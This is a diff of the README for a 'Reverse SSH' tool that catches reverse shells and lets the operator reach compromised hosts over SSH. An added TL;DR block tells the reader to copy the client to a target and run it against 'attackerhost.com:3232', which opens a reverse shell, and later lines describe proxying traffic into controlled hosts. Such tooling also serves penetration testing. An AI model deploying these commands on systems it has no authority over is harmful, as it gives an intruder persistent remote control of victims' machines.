@@ -1,7 +1,8 @@
 # Reverse SSH
 
-Ever wanted to use SSH to talk to your reverse shells? Well now you can. Essentially works like any reverse shell catcher thing. 
-You, the human client connect to the reverse shell catcher with ssh, and then select which remote host you want to connect to. 
+Ever wanted to use SSH for reverse shells? Well now you can.  
+
+The reverse ssh server lets you catch multiple reverse shells, using the fully statically compiled reverse shell binary. 
 
 ```
                     +----------------+                 +---------+
@@ -28,6 +29,19 @@ You, the human client connect to the reverse shell catcher with ssh, and then se
                                                        +---------+
 ```
 
+## TL;DR
+
+```
+make
+cd bin/
+
+cp ~/.ssh/id_ed25519.pub authorized_keys
+
+#copy client to your target 
+./server 0.0.0.0:3232
+./client --foreground attackerhost.com:3232 
+```
+
 
 ## Setup Instructions
 
@@ -36,7 +50,7 @@ You, the human client connect to the reverse shell catcher with ssh, and then se
 make
 ```
 
-Make will build both the `client` and `server` binaries. It will also generate a private key for the `client`, and copy it to the `authorized_controllee_keys` file.
+Make will build both the `client` and `server` binaries. It will also generate a private key for the `client`, and copy the corrosponding public key to the `authorized_controllee_keys` file to enable the reverse shell to connect.
 If you need to build the client for a different architecture. 
 
 ```
@@ -66,7 +80,7 @@ ssh yourserver.com -p 3232
 
 ### Proxy
 
-Using just the general dynamical forward `-D` flag you can proxy to your controlled hosts.
+Using just the general dynamical forward `-D` flag you can proxy network traffic to your controlled hosts.
 
 First you connect to your reverse shell catcher.
 
@@ -110,7 +124,7 @@ catcher$ ls
 ---------------------------------------------------------------------
 | ID                                       | Hostname | IP Address  |
 ---------------------------------------------------------------------
-| 0f6ffecb15d75574e5e955e014e0546f6e2851ac | wombo  | [::1]:45150 |
+| 0f6ffecb15d75574e5e955e014e0546f6e2851ac | wombo  | [::1]:45150   |
 ---------------------------------------------------------------------
 ```
 
@@ -122,8 +136,4 @@ So you you wanted to connect to the client given in the example:
 ```
 Will auto complete the entry for you and on enter will connect you to your reverse shell. 
 
-## Limitations
-
-This doesnt work entirely correctly for windows programs, due to limitations of the windows platform. But you can still run commands. 
-Although they might not end properly, or be ctrl+c-able
 
